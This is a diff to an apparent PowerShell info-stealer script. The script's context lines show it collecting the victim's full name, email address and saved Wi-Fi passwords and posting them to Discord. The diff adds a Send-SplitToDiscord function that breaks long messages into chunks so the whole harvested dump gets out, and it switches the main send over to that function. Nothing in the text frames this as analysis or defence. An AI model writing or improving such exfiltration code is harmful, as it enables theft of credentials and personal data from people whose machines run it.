@@ -422,6 +422,45 @@ function Send-ToDiscord {
     }
 }
 
+function Send-SplitToDiscord {
+    param ($Message)
+
+    # Maximum length for Discord message (leaving some room for formatting)
+    $maxLength = 1900
+
+    # If the message is longer than the max length, split it
+    if ($Message.Length -gt $maxLength) {
+        $chunks = @()  # Initialize an array to hold the message chunks
+        $currentChunk = ""
+
+        # Split the message into lines
+        $lines = $Message -split "`n"
+
+        foreach ($line in $lines) {
+            # If adding the line would exceed the max length, add the current chunk to the array and start a new chunk
+            if (($currentChunk.Length + $line.Length) -gt $maxLength) {
+                $chunks += $currentChunk.Trim()
+                $currentChunk = ""
+            }
+            # Add the line to the current chunk
+            $currentChunk += $line + "`n"
+        }
+
+        # Add the final chunk if it contains any text
+        if ($currentChunk.Trim() -ne "") {
+            $chunks += $currentChunk.Trim()
+        }
+
+        # Send each chunk to Discord
+        foreach ($chunk in $chunks) {
+            Send-ToDiscord -Message $chunk
+        }
+    } else {
+        # If the message is within the limit, send it directly
+        Send-ToDiscord -Message $Message
+    }
+}
+
 # Main Script: Gather System Information
 $FullName = Get-FullName
 $Email = Get-Email
@@ -448,10 +487,8 @@ Wi-Fi Passwords:
 $WiFiPasswords
 "@
 
-# Send System Info to Discord
-Send-ToDiscord -Message $SystemInfo
-
-
+# Send the Full System Info to Discord, Handling Long Messages
+Send-SplitToDiscord -Message $SystemInfo
 
 ############################################################################################################################################################
 
